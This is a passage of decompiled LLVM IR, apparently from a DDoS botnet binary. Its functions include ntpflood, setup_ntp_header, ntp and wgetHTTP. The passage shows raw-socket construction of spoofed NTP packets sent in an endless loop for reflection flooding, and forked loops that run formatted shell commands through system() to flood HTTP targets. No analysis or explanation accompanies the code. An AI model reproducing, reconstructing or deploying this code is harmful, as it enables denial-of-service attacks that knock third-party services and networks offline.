  %v1_100042d8 = and i32 %v1_100042d4, -16
  store i32 %v1_10004214, i32* %r9.global-to-local, align 4
  %v2_1000436c4 = icmp sgt i32 %v1_10004214, 0
  br i1 %v2_1000436c4, label %dec_label_pc_100042f8, label %dec_label_pc_10004374

dec_label_pc_100042f8:                            ; preds = %dec_label_pc_10004164, %dec_label_pc_100042f8
  %storemerge27 = phi i32 [ %v1_1000435c, %dec_label_pc_100042f8 ], [ 0, %dec_label_pc_10004164 ]
  %v1_10004300 = mul i32 %storemerge27, 28
  %v2_10004304 = add i32 %v1_10004300, %v1_100042d8
  %v2_1000430c = inttoptr i32 %v2_10004304 to i32*
  store i32 %storemerge27, i32* %v2_1000430c, align 4
  store i32 %v2_10004304, i32* %r9.global-to-local, align 4
  store i32 %v1_10004298, i32* %r11.global-to-local, align 4
  %v2_10004330 = add i32 %v2_10004304, 8
  %v3_10004330 = inttoptr i32 %v2_10004330 to i32*
  store i32 2, i32* %v3_10004330, align 4
  %v0_10004334 = load i32, i32* %r11.global-to-local, align 4
  %v1_10004334 = load i32, i32* %r9.global-to-local, align 4
  %v2_10004334 = add i32 %v1_10004334, 12
  %v3_10004334 = inttoptr i32 %v2_10004334 to i32*
  store i32 %v0_10004334, i32* %v3_10004334, align 4
  %v0_10004338 = load i32, i32* %r10.global-to-local, align 4
  %v1_10004338 = load i32, i32* %r9.global-to-local, align 4
  %v2_10004338 = add i32 %v1_10004338, 16
  %v3_10004338 = inttoptr i32 %v2_10004338 to i32*
  store i32 %v0_10004338, i32* %v3_10004338, align 4
  %v1_1000433c = load i32, i32* %r9.global-to-local, align 4
  %v2_1000433c = add i32 %v1_1000433c, 20
  %v3_1000433c = inttoptr i32 %v2_1000433c to i32*
  store i32 %tmp, i32* %v3_1000433c, align 4
  store i32 %v1_100042d8, i32* %r9.global-to-local, align 4
  %v3_10004354 = call i32 @sendVSE(i32 %v2_10004304, i32 %tmp, i32 %v1_100042d8)
  %v1_1000435c = add nuw nsw i32 %storemerge27, 1
  store i32 %v1_10004214, i32* %r9.global-to-local, align 4
  %v2_1000436c = icmp slt i32 %v1_1000435c, %v1_10004214
  br i1 %v2_1000436c, label %dec_label_pc_100042f8, label %dec_label_pc_10004374

dec_label_pc_10004374:                            ; preds = %dec_label_pc_100042f8, %dec_label_pc_10004164
  store i32 %v1_100041cc, i32* %r9.global-to-local, align 4
  %v2_1000437c = load i32, i32* %v1_100041d0, align 4
  store i32 %v1_100041ec, i32* %r9.global-to-local, align 4
  %v2_10004388 = load i32, i32* %v1_100041f0, align 4
  store i32 %v2_10004388, i32* %r11.global-to-local, align 4
  store i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  %v7_100043a8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_1002a910.134 to i32), i32 %arg2, i32 %v2_1000437c)
  %v1_10004490 = add i32 %arg4, 24
  %v1_10004494 = inttoptr i32 %v1_10004490 to i32*
  br label %dec_label_pc_1000448c

dec_label_pc_100043b8:                            ; preds = %dec_label_pc_1000448c
  store i32 1000, i32* %r9.global-to-local, align 4
  store i32 268452816, i32* @lr, align 4
  %v1_100043cc = call i32 @usleep(i32 50000)
  %v3_100043d4 = load i32, i32* @global_var_100451ac.120, align 4
  %v2_100043dc = mul i32 %v3_100043d4, 20
  %v3_100043e4 = icmp ugt i32 %v2_100043dc, %v1_10004230
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_100043f0 = load i32, i32* @global_var_10045194.121, align 4
  br i1 %v3_100043e4, label %dec_label_pc_100043ec, label %dec_label_pc_1000442c

dec_label_pc_100043ec:                            ; preds = %dec_label_pc_100043b8
  %v2_100043f4 = icmp sgt i32 %v3_100043f0, 0
  store i32 268697600, i32* %r9.global-to-local, align 4
  br i1 %v2_100043f4, label %dec_label_pc_10004414, label %dec_label_pc_100043fc

dec_label_pc_100043fc:                            ; preds = %dec_label_pc_100043ec
  %v3_10004400 = load i32, i32* @global_var_100450d4.122, align 4
  %v1_10004404 = add i32 %v3_10004400, 100
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 %v1_10004404, i32* @global_var_100450d4.122, align 4
  br label %dec_label_pc_10004474

dec_label_pc_10004414:                            ; preds = %dec_label_pc_100043ec
  %v1_1000441c = add i32 %v3_100043f0, -1
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 %v1_1000441c, i32* @global_var_10045194.121, align 4
  br label %dec_label_pc_10004474

dec_label_pc_1000442c:                            ; preds = %dec_label_pc_100043b8
  %v1_10004434 = add i32 %v3_100043f0, 1
  store i32 %v1_10004434, i32* @global_var_10045194.121, align 4
  %v3_10004444 = load i32, i32* @global_var_100450d4.122, align 4
  %tmp37 = icmp ult i32 %v3_10004444, 26
  store i32 268697600, i32* %r9.global-to-local, align 4
  br i1 %tmp37, label %dec_label_pc_10004468, label %dec_label_pc_10004450

dec_label_pc_10004450:                            ; preds = %dec_label_pc_1000442c
  %v1_10004458 = add i32 %v3_10004444, -25
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 %v1_10004458, i32* @global_var_100450d4.122, align 4
  br label %dec_label_pc_10004474

dec_label_pc_10004468:                            ; preds = %dec_label_pc_1000442c
  store i32 0, i32* @global_var_100450d4.122, align 4
  br label %dec_label_pc_10004474

dec_label_pc_10004474:                            ; preds = %dec_label_pc_10004450, %dec_label_pc_10004414, %dec_label_pc_100043fc, %dec_label_pc_10004468
  store i32 0, i32* @global_var_100451ac.120, align 4
  store i32 %storemerge3, i32* %r9.global-to-local, align 4
  %v1_10004484 = add i32 %storemerge3, 1
  br label %dec_label_pc_1000448c

dec_label_pc_1000448c:                            ; preds = %dec_label_pc_10004374, %dec_label_pc_10004474
  %storemerge3 = phi i32 [ 0, %dec_label_pc_10004374 ], [ %v1_10004484, %dec_label_pc_10004474 ]
  store i32 %v1_10004490, i32* %r9.global-to-local, align 4
  %v2_10004494 = load i32, i32* %v1_10004494, align 4
  store i32 268453024, i32* @lr, align 4
  %v1_1000449c = call i32 @atol(i32 %v2_10004494)
  %v2_100044a8 = mul i32 %v1_1000449c, 20
  store i32 %v2_100044a8, i32* %r9.global-to-local, align 4
  %v3_100044b0 = icmp sgt i32 %v2_100044a8, %storemerge3
  br i1 %v3_100044b0, label %dec_label_pc_100043b8, label %dec_label_pc_100044b8

dec_label_pc_100044b8:                            ; preds = %dec_label_pc_1000448c
  %v0_100044bc = call i32 @__GI_exit()
  br label %dec_label_pc_100044c0

dec_label_pc_100044c0:                            ; preds = %entry, %dec_label_pc_10004134, %dec_label_pc_100044b8
  %v0_100044e4 = phi i32 [ %v1_100040cc, %entry ], [ %v0_10004144, %dec_label_pc_10004134 ], [ %v0_100044bc, %dec_label_pc_100044b8 ]
  %v2_100044c0 = load i32, i32* %stack_var_-2656, align 4
  store i32 %v5_1000409c, i32* %r9.global-to-local, align 4
  store i32 %v2_100044c0, i32* %r11.global-to-local, align 4
  ret i32 %v0_100044e4

; uselistorder directives
  uselistorder i32 %storemerge3, { 2, 0, 1 }
  uselistorder i32 %v3_100043f0, { 1, 0, 2 }
  uselistorder i32 %v1_10004490, { 1, 0 }
  uselistorder i32 %v1_1000435c, { 1, 0 }
  uselistorder i32 %v2_10004304, { 0, 2, 1, 3 }
  uselistorder i32 %storemerge27, { 2, 1, 0 }
  uselistorder i32 %v1_100042d8, { 2, 1, 0 }
  uselistorder i32 %v1_10004214, { 3, 2, 0, 1, 4 }
  uselistorder i32* %stack_var_-2656, { 0, 1, 3, 2 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 8, 16, 18, 9, 11, 10, 12, 13, 14, 15, 17, 19, 20, 21, 27, 22, 23, 24, 25, 26, 0, 28, 29, 30, 31, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_100044c0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000448c, { 1, 0 }
  uselistorder label %dec_label_pc_10004474, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_100042f8, { 1, 0 }
  uselistorder label %dec_label_pc_10004134, { 1, 0 }
  uselistorder label %dec_label_pc_10004108, { 1, 0 }
}

define i32 @wgetHTTP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-1064 = alloca i32, align 4
  %v1_10004514 = call i32 @mfork(i32 %arg2)
  %v3_1000451c = icmp eq i32 %v1_10004514, 0
  br i1 %v3_1000451c, label %dec_label_pc_10004524, label %dec_label_pc_100046f0

dec_label_pc_10004524:                            ; preds = %entry
  %v2_10004528 = icmp sgt i32 %arg3, 1
  br i1 %v2_10004528, label %dec_label_pc_10004550, label %dec_label_pc_10004530

dec_label_pc_10004530:                            ; preds = %dec_label_pc_10004524
  %v6_10004544 = call i32 @Send(i32 %arg1, i32 ptrtoint ([35 x i8]* @global_var_1002a930.136 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  %v0_1000454c = call i32 @__GI_exit()
  br label %dec_label_pc_10004550

dec_label_pc_10004550:                            ; preds = %dec_label_pc_10004524, %dec_label_pc_10004530
  %v1_10004554 = add i32 %arg4, 4
  %v1_10004558 = inttoptr i32 %v1_10004554 to i32*
  %v2_10004558 = load i32, i32* %v1_10004558, align 4
  %v1_10004564 = add i32 %arg4, 8
  %v1_10004568 = inttoptr i32 %v1_10004564 to i32*
  %v2_10004568 = load i32, i32* %v1_10004568, align 4
  store i32 268453236, i32* @lr, align 4
  %v1_10004570 = call i32 @atol(i32 %v2_10004568)
  store i32 268453252, i32* @lr, align 4
  %v1_10004580 = call i32 @__GI_time(i32 0)
  %v2_1000458c = add i32 %v1_10004580, %v1_10004570
  store i32 268453272, i32* @lr, align 4
  %v0_10004594 = call i32 @random()
  %v6_100045fc = call i32 @Send(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_1002a954.246 to i32), i32 %arg2, i32 %v2_10004558)
  store i32 268453592, i32* @lr, align 4
  %v1_100046d45 = call i32 @__GI_time(i32 0)
  %v2_100046e06 = icmp slt i32 %v1_100046d45, %v2_1000458c
  br i1 %v2_100046e06, label %dec_label_pc_10004604.lr.ph, label %dec_label_pc_100046e8

dec_label_pc_10004604.lr.ph:                      ; preds = %dec_label_pc_10004550
  %v2_1000467c = ptrtoint i32* %stack_var_-1064 to i32
  br label %dec_label_pc_10004604

dec_label_pc_10004604:                            ; preds = %dec_label_pc_10004604.lr.ph, %dec_label_pc_10004604
  store i32 268453384, i32* @lr, align 4
  %v0_10004604 = call i32 @random()
  %v2_10004620 = srem i32 %v0_10004604, 36
  %v1_10004644 = mul nsw i32 %v2_10004620, 4
  %v2_10004648 = add i32 %v1_10004644, ptrtoint ([255 x i8*]* @global_var_100402b4.245 to i32)
  %v1_1000464c = inttoptr i32 %v2_10004648 to i32*
  %v2_1000464c = load i32, i32* %v1_1000464c, align 4
  store i32 %v2_1000464c, i32* @r3, align 4
  %v0_10004658 = call i32 @__GI_strlen()
  store i32 %v2_10004558, i32* @r3, align 4
  %v0_10004668 = call i32 @__GI_strlen()
  %v2_10004670 = add i32 %v0_10004658, %v0_10004668
  %v1_10004674 = mul i32 %v2_10004670, 4
  %v1_10004678 = add i32 %v1_10004674, 164
  store i32 %v2_1000467c, i32* @r3, align 4
  store i32 %v1_10004678, i32* @r4, align 4
  store i32 ptrtoint ([181 x i8]* @global_var_1002a974.248 to i32), i32* @r5, align 4
  store i32 268453572, i32* @lr, align 4
  %v9_100046c0 = call i32 @__GI_snprintf(i32 %v2_1000467c, i32 %v1_10004678, i32 ptrtoint ([181 x i8]* @global_var_1002a974.248 to i32), i32 %v2_1000464c, i32 %v2_10004558, i32 %v2_1000464c, i32 %v2_10004558, i32 %v2_10004558)
  store i32 ptrtoint ([3 x i8]* @global_var_100046d0.249 to i32), i32* @lr, align 4
  %v1_100046cc = call i32 @system(i32 %v2_1000467c)
  store i32 268453592, i32* @lr, align 4
  %v1_100046d4 = call i32 @__GI_time(i32 0)
  %v2_100046e0 = icmp slt i32 %v1_100046d4, %v2_1000458c
  br i1 %v2_100046e0, label %dec_label_pc_10004604, label %dec_label_pc_100046e8

dec_label_pc_100046e8:                            ; preds = %dec_label_pc_10004604, %dec_label_pc_10004550
  %v0_100046ec = call i32 @__GI_exit()
  br label %dec_label_pc_100046f0

dec_label_pc_100046f0:                            ; preds = %entry, %dec_label_pc_100046e8
  %v0_10004708 = phi i32 [ %v1_10004514, %entry ], [ %v0_100046ec, %dec_label_pc_100046e8 ]
  ret i32 %v0_10004708

; uselistorder directives
  uselistorder i32 %v1_10004678, { 1, 0 }
  uselistorder i32 %v2_1000467c, { 1, 0, 2 }
  uselistorder i32 %v2_1000458c, { 1, 0 }
  uselistorder i32 268453592, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_100046f0, { 1, 0 }
  uselistorder label %dec_label_pc_10004604, { 1, 0 }
  uselistorder label %dec_label_pc_10004550, { 1, 0 }
}

define i32 @setup_ntp_header(i16* %arg1) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_1000470c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_1000470c, i32* %stack_var_-32, align 4
  store i32 5678, i32* @r3, align 4
  %v1_10004728 = call i32 @htons(i32 5678)
  %sext = mul i32 %v1_10004728, 65536
  %v1_1000472c = sdiv i32 %sext, 65536
  store i32 %tmp, i32* %r9.global-to-local, align 4
  %v1_10004734 = trunc i32 %v1_1000472c to i16
  store i16 %v1_10004734, i16* %arg1, align 2
  store i32 123, i32* @r3, align 4
  %v1_1000473c = call i32 @htons(i32 123)
  %v1_10004748 = trunc i32 %v1_1000473c to i16
  %v3_10004748 = add i32 %tmp, 2
  %v4_10004748 = inttoptr i32 %v3_10004748 to i16*
  store i16 %v1_10004748, i16* %v4_10004748, align 2
  %v3_10004754 = add i32 %tmp, 6
  %v4_10004754 = inttoptr i32 %v3_10004754 to i16*
  store i16 0, i16* %v4_10004754, align 2
  %v1_1000475c = add i32 %tmp, 8
  store i32 %v1_1000475c, i32* %r11.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_10004770 = inttoptr i32 %v1_1000475c to i32*
  store i32 385876778, i32* %v2_10004770, align 4
  %v0_10004774 = load i32, i32* %r9.global-to-local, align 4
  %v1_10004774 = load i32, i32* %r11.global-to-local, align 4
  %v2_10004774 = add i32 %v1_10004774, 4
  %v3_10004774 = inttoptr i32 %v2_10004774 to i32*
  store i32 %v0_10004774, i32* %v3_10004774, align 4
  store i32 16, i32* @r3, align 4
  %v1_1000477c = call i32 @htons(i32 16)
  %v2_1000477c = trunc i32 %v1_1000477c to i16
  store i32 %tmp, i32* %r9.global-to-local, align 4
  %v3_10004788 = add i32 %tmp, 4
  %v4_10004788 = inttoptr i32 %v3_10004788 to i16*
  store i16 %v2_1000477c, i16* %v4_10004788, align 2
  %v2_1000478c = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_1000478c, i32* %r11.global-to-local, align 4
  ret i32 %v1_1000477c

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2, 3, 4, 5 }
}

define i32 @ntpflood(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4144 = alloca i32, align 4
  %v2_100047c4 = ptrtoint i32* %stack_var_-4144 to i32
  %v1_100047d0 = add i32 %v2_100047c4, 20
  %v5_100047d4 = inttoptr i32 %v1_100047d0 to i16*
  %v1_100047e0 = add i32 %arg1, 12
  %v2_100047e0 = inttoptr i32 %v1_100047e0 to i32*
  %v3_100047e0 = load i32, i32* %v2_100047e0, align 4
  %v1_10004800 = add i32 %arg1, 4
  %v2_10004800 = inttoptr i32 %v1_10004800 to i32*
  %v3_10004800 = load i32, i32* %v2_10004800, align 4
  store i32 268453912, i32* @lr, align 4
  %v3_10004814 = call i32 @socket(i32 2, i32 3, i32 6)
  %tmp26 = icmp sgt i32 %v3_10004814, -1
  br i1 %tmp26, label %dec_label_pc_10004834, label %dec_label_pc_1000482c

dec_label_pc_1000482c:                            ; preds = %entry
  %v0_10004830 = call i32 @__GI_exit()
  br label %dec_label_pc_10004834

dec_label_pc_10004834:                            ; preds = %entry, %dec_label_pc_1000482c
  store i32 268453948, i32* @lr, align 4
  %v1_10004838 = call i32 @__GI_time(i32 0)
  %v1_10004844 = call i32 @init_rand(i32 %v1_10004838)
  store i32 %v2_100047c4, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 4096, i32* @r5, align 4
  store i32 268453984, i32* @lr, align 4
  %v0_1000485c = call i32 @__GI_memset()
  store i32 268453992, i32* @lr, align 4
  %v2_10004864 = call i32 @setup_ip_header(i32* nonnull %stack_var_-4144)
  store i32 268454000, i32* @lr, align 4
  %v2_1000486c = call i32 @setup_ntp_header(i16* %v5_100047d4)
  store i32 268454004, i32* @lr, align 4
  %v0_10004870 = call i32 @random()
  %v2_10004890 = srem i32 %v0_10004870, 64509
  %fold = add nsw i32 %v2_10004890, 1026
  %v1_100048d0 = urem i32 %fold, 65536
  store i32 %v1_100048d0, i32* @r3, align 4
  %v1_100048d8 = call i32 @htons(i32 %v1_100048d0)
  %v1_100048e4 = trunc i32 %v1_100048d8 to i16
  store i16 %v1_100048e4, i16* %v5_100047d4, align 4
  %v2_100048f0 = add i32 %v2_100047c4, 12
  %v3_100048f0 = inttoptr i32 %v2_100048f0 to i32*
  store i32 %v3_100047e0, i32* %v3_100048f0, align 4
  %v1_100048f8 = add i32 %v3_10004800, 4
  %v2_100048f8 = inttoptr i32 %v1_100048f8 to i32*
  %v3_100048f8 = load i32, i32* %v2_100048f8, align 4
  %v2_10004900 = add i32 %v2_100047c4, 16
  %v3_10004900 = inttoptr i32 %v2_10004900 to i32*
  store i32 %v3_100048f8, i32* %v3_10004900, align 4
  %v1_1000490c = or i32 %v2_100047c4, 2
  %v2_1000490c = inttoptr i32 %v1_1000490c to i16*
  %v3_1000490c = load i16, i16* %v2_1000490c, align 2
  %div = udiv i16 %v3_1000490c, 2
  %v1_10004914 = zext i16 %div to i32
  %v2_10004924 = bitcast i32* %stack_var_-4144 to i16*
  %v3_10004924 = call i32 @csum(i16* %v2_10004924, i32 %v1_10004914)
  %v1_10004930 = trunc i32 %v3_10004924 to i16
  %v3_10004930 = add i32 %v2_100047c4, 10
  %v4_10004930 = inttoptr i32 %v3_10004930 to i16*
  store i16 %v1_10004930, i16* %v4_10004930, align 2
  store i32 1, i32* %stack_var_-32, align 4
  %v2_1000493c = ptrtoint i32* %stack_var_-32 to i32
  store i32 268454236, i32* @lr, align 4
  %v5_10004958 = call i32 @__GI_setsockopt(i32 %v3_10004814, i32 0, i32 3, i32 %v2_1000493c, i32 4)
  %tmp28 = icmp sgt i32 %v5_10004958, -1
  br i1 %tmp28, label %dec_label_pc_10004970, label %dec_label_pc_10004968

dec_label_pc_10004968:                            ; preds = %dec_label_pc_10004834
  %v0_1000496c = call i32 @__GI_exit()
  br label %dec_label_pc_10004970

dec_label_pc_10004970:                            ; preds = %dec_label_pc_10004834, %dec_label_pc_10004968
  store i32 268454264, i32* @lr, align 4
  %v1_10004974 = call i32 @__GI_time(i32 0)
  %v1_10004980 = call i32 @init_rand(i32 %v1_10004974)
  %v3_100049fc = add i32 %v2_100047c4, 4
  %v4_100049fc = inttoptr i32 %v3_100049fc to i16*
  br label %dec_label_pc_1000498c

dec_label_pc_1000498c:                            ; preds = %dec_label_pc_10004a70, %dec_label_pc_10004970
  %stack_var_-4160.0 = phi i32 [ %v3_10004800, %dec_label_pc_10004970 ], [ %v3_100049c8, %dec_label_pc_10004a70 ]
  %storemerge4 = phi i32 [ 0, %dec_label_pc_10004970 ], [ %v1_10004a74, %dec_label_pc_10004a70 ]
  %v3_10004990 = load i16, i16* %v2_1000490c, align 2
  %v4_10004990 = zext i16 %v3_10004990 to i32
  store i32 268454340, i32* @lr, align 4
  %v6_100049c0 = call i32 @sendto(i32 %v3_10004814, i32 %v2_100047c4, i32 %v4_10004990, i32 0, i32 %stack_var_-4160.0, i32 16)
  %v1_100049c8 = add i32 %stack_var_-4160.0, 532
  %v2_100049c8 = inttoptr i32 %v1_100049c8 to i32*
  %v3_100049c8 = load i32, i32* %v2_100049c8, align 4
  %v1_100049d4 = add i32 %v3_100049c8, 4
  %v2_100049d4 = inttoptr i32 %v1_100049d4 to i32*
  %v3_100049d4 = load i32, i32* %v2_100049d4, align 4
  store i32 %v3_100049d4, i32* %v3_10004900, align 4
  %v0_100049e0 = call i32 @rand_cmwc()
  store i32 %v0_100049e0, i32* @r3, align 4
  %v1_100049ec = call i32 @htonl(i32 %v0_100049e0)
  %v1_100049fc = trunc i32 %v1_100049ec to i16
  store i16 %v1_100049fc, i16* %v4_100049fc, align 4
  %v3_10004a08 = load i16, i16* %v2_1000490c, align 2
  %div29 = udiv i16 %v3_10004a08, 2
  %v1_10004a10 = zext i16 %div29 to i32
  %v3_10004a20 = call i32 @csum(i16* %v2_10004924, i32 %v1_10004a10)
  %v1_10004a2c = trunc i32 %v3_10004a20 to i16
  store i16 %v1_10004a2c, i16* %v4_10004930, align 2
  %v3_10004a34 = load i32, i32* @global_var_100451ac.120, align 4
  %v1_10004a38 = add i32 %v3_10004a34, 1
  store i32 %v1_10004a38, i32* @global_var_100451ac.120, align 4
  %v3_10004a48 = load i32, i32* @global_var_10045194.121, align 4
  %v3_10004a50 = icmp ugt i32 %v3_10004a48, %storemerge4
  br i1 %v3_10004a50, label %dec_label_pc_10004a70, label %dec_label_pc_10004a58

dec_label_pc_10004a58:                            ; preds = %dec_label_pc_1000498c
  %v3_10004a64 = load i32, i32* @global_var_100450d4.122, align 4
  store i32 268454512, i32* @lr, align 4
  %v1_10004a6c = call i32 @usleep(i32 %v3_10004a64)
  br label %dec_label_pc_10004a70

dec_label_pc_10004a70:                            ; preds = %dec_label_pc_1000498c, %dec_label_pc_10004a58
  %stack_var_-20.0 = phi i32 [ %storemerge4, %dec_label_pc_1000498c ], [ 0, %dec_label_pc_10004a58 ]
  %v1_10004a74 = add i32 %stack_var_-20.0, 1
  br label %dec_label_pc_1000498c

; uselistorder directives
  uselistorder i32 %v3_100049c8, { 1, 0 }
  uselistorder i32 %stack_var_-4160.0, { 1, 0 }
  uselistorder i32 %v1_100048d0, { 1, 0 }
  uselistorder i32 %v2_100047c4, { 5, 1, 2, 0, 3, 4, 6, 7 }
  uselistorder i32* %stack_var_-4144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder i32 (i32*)* @setup_ip_header, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10004a70, { 1, 0 }
  uselistorder label %dec_label_pc_10004970, { 1, 0 }
  uselistorder label %dec_label_pc_10004834, { 1, 0 }
}

define i32 @ntp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-1080 = alloca i32, align 4
  %stack_var_-1136 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10004a80 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10004a80, i32* %stack_var_-1136, align 4
  %v5_10004a80 = ptrtoint i32* %stack_var_-1136 to i32
  %v1_10004ab8 = call i32 @mfork(i32 %arg2)
  %v3_10004ac0 = icmp eq i32 %v1_10004ab8, 0
  br i1 %v3_10004ac0, label %dec_label_pc_10004ac8, label %dec_label_pc_100050b8

dec_label_pc_10004ac8:                            ; preds = %entry
  store i32 268454616, i32* @lr, align 4
  %v3_10004ad4 = call i32 @socket(i32 2, i32 3, i32 255)
  %tmp37 = icmp sgt i32 %v3_10004ad4, -1
  br i1 %tmp37, label %dec_label_pc_10004af4, label %dec_label_pc_10004aec

dec_label_pc_10004aec:                            ; preds = %dec_label_pc_10004ac8
  %v0_10004af0 = call i32 @__GI_exit()
  br label %dec_label_pc_10004af4

dec_label_pc_10004af4:                            ; preds = %dec_label_pc_10004ac8, %dec_label_pc_10004aec
  %v2_10004af8 = icmp sgt i32 %arg3, 5
  br i1 %v2_10004af8, label %dec_label_pc_10004b20, label %dec_label_pc_10004b00

dec_label_pc_10004b00:                            ; preds = %dec_label_pc_10004af4
  store i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  %v6_10004b14 = call i32 @Send(i32 %arg1, i32 ptrtoint ([112 x i8]* @global_var_1002aa38.255 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  %v0_10004b1c = call i32 @__GI_exit()
  br label %dec_label_pc_10004b20

dec_label_pc_10004b20:                            ; preds = %dec_label_pc_10004af4, %dec_label_pc_10004b00
  %v1_10004b24 = add i32 %arg4, 12
  store i32 %v1_10004b24, i32* %r9.global-to-local, align 4
  %v1_10004b28 = inttoptr i32 %v1_10004b24 to i32*
  %v2_10004b28 = load i32, i32* %v1_10004b28, align 4
  store i32 %v2_10004b28, i32* @r3, align 4
  %v0_10004b30 = call i32 @__GI_strlen()
  %v1_10004b38 = mul i32 %v0_10004b30, 5
  store i32 %v1_10004b38, i32* %r9.global-to-local, align 4
  %v1_10004b3c = add i32 %v1_10004b38, 160
  %v2_10004b48 = icmp sgt i32 %v1_10004b3c, 1023
  br i1 %v2_10004b48, label %dec_label_pc_100050b8, label %dec_label_pc_10004b50

dec_label_pc_10004b50:                            ; preds = %dec_label_pc_10004b20
  store i32 %v1_10004b3c, i32* %r10.global-to-local, align 4
  store i32 %v1_10004b24, i32* %r9.global-to-local, align 4
  %v2_10004b5c = load i32, i32* %v1_10004b28, align 4
  store i32 %v1_10004b24, i32* %r9.global-to-local, align 4
  %v2_10004b68 = load i32, i32* %v1_10004b28, align 4
  store i32 %v1_10004b24, i32* %r9.global-to-local, align 4
  %v2_10004b74 = load i32, i32* %v1_10004b28, align 4
  store i32 %v1_10004b24, i32* %r9.global-to-local, align 4
  %v2_10004b80 = load i32, i32* %v1_10004b28, align 4
  store i32 %v1_10004b24, i32* %r9.global-to-local, align 4
  %v2_10004b8c = load i32, i32* %v1_10004b28, align 4
  store i32 %v2_10004b8c, i32* %r11.global-to-local, align 4
  %v2_10004b90 = ptrtoint i32* %stack_var_-1080 to i32
  store i32 %v2_10004b90, i32* @r3, align 4
  store i32 %v1_10004b3c, i32* @r4, align 4
  store i32 ptrtoint ([171 x i8]* @global_var_1002aaa8.257 to i32), i32* @r5, align 4
  store i32 %v2_10004b80, i32* %r9.global-to-local, align 4
  store i32 %v2_10004b8c, i32* %r10.global-to-local, align 4
  store i32 268454844, i32* @lr, align 4
  %v9_10004bb8 = call i32 @__GI_snprintf(i32 %v2_10004b90, i32 %v1_10004b3c, i32 ptrtoint ([171 x i8]* @global_var_1002aaa8.257 to i32), i32 %v2_10004b5c, i32 %v2_10004b68, i32 %v2_10004b74, i32 %v2_10004b80, i32 %v1_10004b3c)
  store i32 ptrtoint ([3 x i8]* @global_var_10004bc8.258 to i32), i32* @lr, align 4
  %v1_10004bc4 = call i32 @system(i32 %v2_10004b90)
  store i32 268454864, i32* @lr, align 4
  %v1_10004bcc = call i32 @__GI_time(i32 0)
  store i32 ptrtoint (i32* @global_var_10004bdc.259 to i32), i32* @lr, align 4
  %v1_10004bd8 = call i32 @srand(i32 %v1_10004bcc)
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 0, i32* @global_var_100451b4.106, align 4
  store i32 128, i32* @r3, align 4
  store i32 268454916, i32* @lr, align 4
  %v0_10004c00 = call i32 @malloc()
  store i32 128, i32* %r9.global-to-local, align 4
  store i32 %v0_10004c00, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  store i32 268454948, i32* @lr, align 4
  %v0_10004c20 = call i32 @__GI_memset()
  %v1_10004c30 = add i32 %arg4, 16
  store i32 %v1_10004c30, i32* %r9.global-to-local, align 4
  %v1_10004c34 = inttoptr i32 %v1_10004c30 to i32*
  %v2_10004c34 = load i32, i32* %v1_10004c34, align 4
  store i32 268454976, i32* @lr, align 4
  %v1_10004c3c = call i32 @atol(i32 %v2_10004c34)
  %v1_10004c4c = add i32 %arg4, 20
  store i32 %v1_10004c4c, i32* %r9.global-to-local, align 4
  %v1_10004c50 = inttoptr i32 %v1_10004c4c to i32*
  %v2_10004c50 = load i32, i32* %v1_10004c50, align 4
  store i32 268455004, i32* @lr, align 4
  %v1_10004c58 = call i32 @atol(i32 %v2_10004c50)
  store i32 0, i32* @global_var_10045194.121, align 4
  store i32 0, i32* @global_var_100451ac.120, align 4
  store i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  store i32 268455064, i32* @lr, align 4
  %v3_10004c94 = call i32 @__GI_fopen(i32 ptrtoint ([8 x i8]* @global_var_1002ab54.260 to i32), i32 ptrtoint ([2 x i8]* @global_var_1002a6f0.111 to i32))
  %v2_10004cb8 = add i32 %v0_10004c20, -1
  br label %dec_label_pc_10004e30.outer

dec_label_pc_10004ca4:                            ; preds = %dec_label_pc_10004e30
  store i32 %v0_10004c20, i32* @r3, align 4
  %v0_10004ca8 = call i32 @__GI_strlen()
